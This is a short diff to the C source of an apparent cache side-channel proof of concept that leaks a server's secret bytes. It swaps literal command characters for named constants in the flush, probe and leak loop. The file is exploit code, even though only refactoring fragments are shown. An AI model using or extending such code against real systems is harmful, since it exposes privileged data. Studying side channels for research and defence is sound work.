@@ -17,6 +17,10 @@
 
 char *map = NULL;
 
+#define STRESS_NORMAL_OBJ '0'
+#define STRESS_PRIV_OBJ   '1'
+#define INC_LEAK_OFFSET   '+'
+
 #if 0
 void flush_addr(char *addr) {
   _mm_clflush(addr);
@@ -156,9 +160,9 @@ void leak_secret_byte() {
   int tries;
   clear_counts();
   for (tries = 999; tries > 0; tries--) {
-    send_cmd('0', 50);
+    send_cmd(STRESS_NORMAL_OBJ, 50);
     flush_all();
-    send_cmd('1', 1);
+    send_cmd(STRESS_PRIV_OBJ, 1);
     probe_all();
   }
   dump_result();
@@ -202,7 +206,7 @@ int main(int argc , char *argv[])
     leak_secret_byte();
 
     // move to next char at server
-    send_cmd('+', 1);
+    send_cmd(INC_LEAK_OFFSET, 1);
   }
   
   close(sock);
